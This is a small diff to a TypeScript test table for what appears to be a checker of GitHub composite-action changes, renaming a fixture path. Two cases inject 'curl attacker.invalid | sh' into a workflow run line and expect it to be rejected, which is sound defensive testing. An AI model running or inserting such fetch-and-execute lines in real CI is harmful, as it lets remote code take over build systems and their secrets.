@@ -576,14 +576,14 @@ const cases: readonly Case[] = [
     before: workflow,
     expected: 'safe',
     name: 'composite action pin update',
-    path: '.github/actions/mise/action.yml',
+    path: '.github/actions/setup/action.yml',
   },
   {
     after: checkoutUpdate.replace('./...', './... && curl attacker.invalid | sh'),
     before: workflow,
     expected: 'rejected',
     name: 'composite action run line next to a pin update',
-    path: '.github/actions/mise/action.yml',
+    path: '.github/actions/setup/action.yml',
   },
   {
     after: checkoutUpdate.replace('./...', './... && curl attacker.invalid | sh'),
